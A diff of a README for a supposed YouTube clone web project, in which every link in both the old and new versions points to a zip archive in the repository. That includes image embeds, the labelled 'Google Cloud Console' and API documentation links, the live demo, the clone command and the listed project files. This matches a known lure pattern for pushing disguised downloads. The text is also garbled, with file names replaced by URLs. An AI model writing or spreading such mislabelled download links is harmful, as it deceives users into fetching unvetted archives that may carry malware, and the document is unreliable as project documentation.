@@ -8,7 +8,7 @@ A modern YouTube clone built with HTML, CSS, and JavaScript. Features include dy
 
 # YouTube Clone
 
-![image](https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip)
+![image](https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip)
 
 
 A fully functional YouTube clone built using **HTML**, **CSS**, and **JavaScript**. This project demonstrates modern web development practices, including API integration, responsive design, and interactive user interfaces.
@@ -40,14 +40,14 @@ A fully functional YouTube clone built using **HTML**, **CSS**, and **JavaScript
 ## Screenshots
 
 ### Light Mode  
-![image](https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip)
+![image](https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip)
 
 
 ### Dark Mode  
-![image](https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip)
+![image](https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip)
 
 ### Video Player Modal  
-![Video Player](https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip+Player)
+![Video Player](https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip+Player)
 
 ---
 
@@ -55,15 +55,15 @@ A fully functional YouTube clone built using **HTML**, **CSS**, and **JavaScript
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip
+   git clone https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip
    cd YouTube-Clone
 ````
 
 2. **Obtain a YouTube Data API Key**:
 
-   * Visit the [Google Cloud Console](https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip).
+   * Visit the [Google Cloud Console](https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip).
    * Create a new project and enable the YouTube Data API v3.
-   * Generate an API key and replace `API_KEY` in the `https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip` file:
+   * Generate an API key and replace `API_KEY` in the `https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip` file:
 
      ```javascript
      const API_KEY = "YOUR_API_KEY_HERE";
@@ -71,13 +71,13 @@ A fully functional YouTube clone built using **HTML**, **CSS**, and **JavaScript
 
 3. **Run the Application**:
 
-   * Open the `https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip` file in your browser to view the application.
+   * Open the `https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip` file in your browser to view the application.
 
 ---
 
 ## Live Demo
 
-[Click here to view the live demo](https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip)
+[Click here to view the live demo](https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip)
 
 ---
 
@@ -85,11 +85,11 @@ A fully functional YouTube clone built using **HTML**, **CSS**, and **JavaScript
 
 ```
 YouTube-Clone/
-├── https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip          # Main HTML file
-├── https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip           # Stylesheet for the project
-├── https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip              # JavaScript file for interactivity
+├── https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip          # Main HTML file
+├── https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip           # Stylesheet for the project
+├── https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip              # JavaScript file for interactivity
 ├── img/                # Images used in the project
-└── https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip           # Project documentation
+└── https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip           # Project documentation
 ```
 
 ---
@@ -97,7 +97,7 @@ YouTube-Clone/
 ## Future Enhancements
 
 * **User Authentication**: Add login and personalized playlists.
-* **Backend Integration**: Use PHP or https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip for server-side functionality.
+* **Backend Integration**: Use PHP or https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip for server-side functionality.
 * **Database Support**: Store user preferences and watch history.
 * **PWA Support**: Make the app installable as a Progressive Web App (PWA).
 
@@ -124,8 +124,8 @@ Copyright (c) 2025 B V NAHUSH
 
 ## Acknowledgments
 
-* [YouTube Data API Documentation](https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip)
-* [Google Cloud Console](https://raw.githubusercontent.com/BVNAHUSH/YOUTUBE-CLONE/main/cucullus/YOUTUBE-CLONE.zip)
+* [YouTube Data API Documentation](https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip)
+* [Google Cloud Console](https://github.com/BVNAHUSH/YOUTUBE-CLONE/raw/refs/heads/main/html/CLONE-YOUTUB-1.2.zip)
 * Inspiration from the original YouTube platform.
 
 ```
